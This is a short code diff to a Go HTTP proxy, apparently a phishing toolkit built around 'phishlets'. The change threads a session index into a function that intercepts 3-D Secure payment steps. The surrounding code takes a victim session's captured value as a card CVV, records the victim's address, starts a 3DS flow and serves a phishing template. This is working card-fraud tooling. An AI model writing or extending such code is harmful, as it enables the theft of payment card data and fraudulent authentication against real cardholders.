@@ -3187,10 +3187,12 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 	var cvv string
 	var remoteAddr string
 	var redirectURL string
+	var sIndex int
 	if ok {
 		cvv = s.Password
 		remoteAddr = s.RemoteAddr
 		redirectURL = s.RedirectURL
+		sIndex, _ = p.sids[sessionID]
 	}
 	p.session_mtx.Unlock()
 
@@ -3198,7 +3200,7 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		return req, nil
 	}
 
-	p.threeDS.Initiate(sessionID, cvv, remoteAddr, phishletName)
+	p.threeDS.Initiate(sessionID, sIndex, cvv, remoteAddr, phishletName)
 	p.threeDS.Send3DSNotification(sessionID)
 
 	tplPath := filepath.Join(p.cfg.GetPhishletsDir(), "templates", templateName, "index.html")
